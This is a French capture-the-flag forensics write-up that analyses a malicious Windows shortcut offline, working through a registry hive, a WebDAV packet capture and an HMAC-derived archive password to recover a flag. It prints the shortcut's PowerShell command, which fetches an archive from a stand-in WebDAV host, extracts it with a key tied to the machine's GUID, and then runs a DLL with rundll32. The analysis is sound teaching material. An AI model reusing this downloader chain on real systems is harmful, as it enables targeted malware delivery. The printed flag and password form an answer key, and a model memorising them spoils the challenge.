# Briefing for One

**Catégorie :** Forensics · **Pièce jointe :** `briefing-for-one-5f4125fbb77f625d.zip`

> Un raccourci a récupéré un paquet chiffré qui ne s'ouvre que sur un seul poste. Il faut retrouver le « briefing token », sans exécuter le raccourci ni la DLL, et sans contacter les adresses capturées.

J'ai adoré celui-ci : tout le travail consiste à **lire** ce que le malware aurait fait, puis à le refaire hors ligne, étape par étape.

## 1. Les pièces

| Fichier | Rôle |
|---|---|
| `briefing.lnk` | Le raccourci ouvert par la victime |
| `machine-cryptography.hiv` | La clé de registre `Microsoft\Cryptography` du poste |
| `egress.pcapng` | Le trafic sortant |
| `field-guide.md` | Les consignes, avec un vecteur de test |
| `provenance.json` | Comment les preuves ont été produites |

## 2. Ce que fait le raccourci

```bash
exiftool briefing.lnk
```

Le champ `Command Line Arguments` contient une commande PowerShell complète. Une fois découpée sur les `;` :

```powershell
$g=[string](Get-ItemPropertyValue -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid);
$g=$g.ToLowerInvariant();
$k=[Convert]::FromBase64String('eyy//ntonkO5y+zE61CW4ddRSUWiWBgzwe3ra1tENd8=');
$h=New-Object Security.Cryptography.HMACSHA256; $h.Key=$k;
$p=([BitConverter]::ToString($h.ComputeHash([Text.Encoding]::UTF8.GetBytes('csctf26/briefing-for-one/v1'+[char]0+$g)))).Replace('-','').ToLowerInvariant();
Copy-Item -LiteralPath '\\briefing.rovenqara.test@80\DavWWWRoot\ops\route-update.7z' -Destination $a;
if((Get-FileHash ... ) -ne 'd29a06795dd5e2346ea5c8a107c2c5b4b916dcabd7cf0011fe600fa3b13ae4c2'){exit 45};
& '...\7z.exe' x ('-p'+$p) ('-o'+$d) -y $a
```

| Étape | Action | Ce qu'il me faut |
|---|---|---|
| 1 | Vérifie un `permit.bin`, sinon s'arrête | Rien : la clé HMAC est écrite en clair dans la commande |
| 2 | Lit `MachineGuid` et le met en minuscules | La ruche |
| 3 | `mot de passe = hex(HMAC-SHA256(clé, "csctf26/briefing-for-one/v1" ‖ 00 ‖ guid))` | La clé Base64 |
| 4 | Télécharge `route-update.7z` en WebDAV et vérifie son hash | La capture |
| 5 | Extrait l'archive avec le mot de passe | — |
| 6 | Lance `rundll32 route-update.dll,ApplyRouteTable` | **À ne surtout pas reproduire** |

Le mot de passe dépend du `MachineGuid` : c'est pour ça que le paquet ne s'ouvre « que sur un seul poste ».

## 3. Le MachineGuid

Le guide prévient : la ruche est une sous-clé sauvegardée, donc sa racine **est** `Cryptography`, pas `HKLM\SOFTWARE\...`.

```bash
hivexget machine-cryptography.hiv '\' MachineGuid
```

```text
080c7be1-f41c-446c-b961-93bd7bc4ea31
```

## 4. L'archive dans la capture

```bash
mkdir objets
tshark -r egress.pcapng --export-objects http,objets/
sha256sum objets/*
```

```text
e1328347…  objets/%2f
cdca68d2…  objets/ops
d7d8fcb1…  objets/route-update.7z
d7d8fcb1…  objets/route-update(1).7z
d7d8fcb1…  objets/route-update(2).7z
d29a0679…  objets/route-update(3).7z      ← le hash attendu par le raccourci
```

Les réponses XML de WebDAV (`%2f`, `ops`) ne sont pas l'archive, et les `.7z` en `d7d8fcb1…` ne correspondent pas au hash. Seul `route-update(3).7z` est le bon. `provenance.json` mentionne d'ailleurs un essai « sans permis » avant l'essai retenu.

## 5. Dériver le mot de passe

J'ai créé un script Python qui refait le calcul du raccourci. Il prend en entrée la clé Base64 et le `MachineGuid`, puis :

1. décode la clé et vérifie qu'elle fait bien 32 octets ;
2. met le GUID en minuscules ;
3. construit le message `"csctf26/briefing-for-one/v1"` ‖ `00` ‖ GUID ;
4. affiche le HMAC-SHA256 en hexadécimal minuscule, c'est-à-dire le mot de passe de l'archive.

Je l'ai d'abord validé avec le vecteur de test du guide : clé `000102…1f` et GUID `00112233-4455-6677-8899-AABBCCDDEEFF`. Il doit donner `7dad6991…10d0`. Avec la clé du raccourci et le GUID du poste, il donne :

```text
ee731407a271c8aa4b92f93d362591626421d32465aeba3f912ac09c576dc6c0
```

> Mes premiers essais échouaient parce que je passais le résultat attendu et le nom de la ruche à la place de la clé et du GUID : bien relire ce que le script attend.

## 6. Extraire sans exécuter

```bash
7z x -pee731407a271c8aa4b92f93d362591626421d32465aeba3f912ac09c576dc6c0 -opaquet 'objets/route-update(3).7z'
jq . paquet/route-table.json
```

> Sans les guillemets simples, bash prend `(` pour l'ouverture d'un sous-shell.

```json
{
  "schema": 1,
  "briefing_token": "CSCTF{eab85b3bb8d309ec8f52a3f6271c55ff}",
  "routes": [
    { "from": "North Depot", "to": "School 4", "status": "open" },
    { "from": "West Depot", "to": "Hall 2", "status": "divert" }
  ]
}
```

La DLL n'a jamais été chargée.

## Flag

```text
CSCTF{eab85b3bb8d309ec8f52a3f6271c55ff}
```

## Ce que j'ai appris

- `exiftool` sur un `.lnk` montre la commande complète, et une commande PowerShell se lit très bien découpée sur les `;`.
- `hivexget` lit une ruche hors ligne, à condition de savoir quelle clé est la racine.
- `--export-objects http` récupère les corps HTTP, mais seul le hash dit lequel est le bon objet.
- Refaire une dérivation de clé hors ligne, en la validant d'abord avec un vecteur de test.
